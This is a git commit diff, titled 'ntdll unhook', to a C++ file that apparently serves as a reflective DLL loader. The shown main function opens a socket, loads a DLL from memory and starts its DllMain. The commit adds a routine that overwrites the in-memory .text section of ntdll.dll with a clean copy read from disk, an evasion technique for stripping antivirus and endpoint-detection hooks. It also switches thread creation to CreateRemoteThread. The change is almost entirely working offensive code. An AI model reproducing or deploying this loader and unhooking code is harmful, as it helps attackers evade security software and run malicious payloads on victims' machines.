36fcbdd0893e8e3def458a2b1c1e7352549a4772
真 罗 <1959132915@qq.com>
2020-03-02 12:53:44 +0800

    ntdll unhook

--- ReflectiveBase64DLL/ReflectiveBase64DLL.cpp
+++ ReflectiveBase64DLL/ReflectiveBase64DLL.cpp
@@ -2,39 +2,54 @@
 #include <WS2tcpip.h>
 #include <Windows.h>
 #include "base64.h"
-#include <Tlhelp32.h>
 #include "MemoryLoadDll.h"
-
+//#include <winternl.h>
+#include <psapi.h>
 #pragma comment(lib, "ws2_32.lib")
 
-DWORD GetProcessIdByName(LPCTSTR lpszProcessName)
+BOOL  NtdllUnhook()
 {
-	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-	if (hSnapshot == INVALID_HANDLE_VALUE)
-	{
-		return 0;
+	HANDLE process = GetCurrentProcess();
+	MODULEINFO mi = {};
+	HMODULE ntdllModule = GetModuleHandleA("ntdll.dll");
+
+	GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
+	LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;
+	HANDLE ntdllFile = CreateFileA("c:\\windows\\system32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+	HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
+	LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);
+
+	PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
+	PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);
+
+	for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
+		PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
+
+		if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text")) {
+			DWORD oldProtection = 0;
+			bool isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
+			memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
+			isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
+		}
 	}
 
-	PROCESSENTRY32 pe;
-	pe.dwSize = sizeof pe;
+	CloseHandle(process);
+	CloseHandle(ntdllFile);
+	CloseHandle(ntdllMapping);
+	FreeLibrary(ntdllModule);
 
-	if (Process32First(hSnapshot, &pe))
-	{
-		do {
-			if (lstrcmpi(lpszProcessName, pe.szExeFile) == 0)
-			{
-				CloseHandle(hSnapshot);
-				return pe.th32ProcessID;
-			}
-		} while (Process32Next(hSnapshot, &pe));
-	}
-
-	CloseHandle(hSnapshot);
-	return 0;
+	return TRUE;
 }
+
 
 int main(int argc,char* argv[])
 {
+
+	BOOL ret = NtdllUnhook();
+	if (!ret)
+	{
+		return 1;
+	}
 	WSADATA wsaData;
 	WSAStartup(MAKEWORD(2, 2), &wsaData);
 	SOCKET ConnectSocket;
@@ -69,8 +84,9 @@ int main(int argc,char* argv[])
 
 	typedef BOOL(*typedef_dllmain)(void);
 	FARPROC dllmain = (FARPROC)MmGetProcAddress(lpBaseAddress, (PCHAR)"DllMain");
-	CreateThread(0, 0,(LPTHREAD_START_ROUTINE)dllmain, 0, 0, 0);
-	
+	//dllmain();
+	//CreateThread(0, 0,(LPTHREAD_START_ROUTINE)dllmain, 0, 0, 0);
+	CreateRemoteThread(GetCurrentProcess(), 0, 0, (LPTHREAD_START_ROUTINE)dllmain, 0, 0, 0);
 
 	iResult = closesocket(ConnectSocket);
 	WSACleanup();
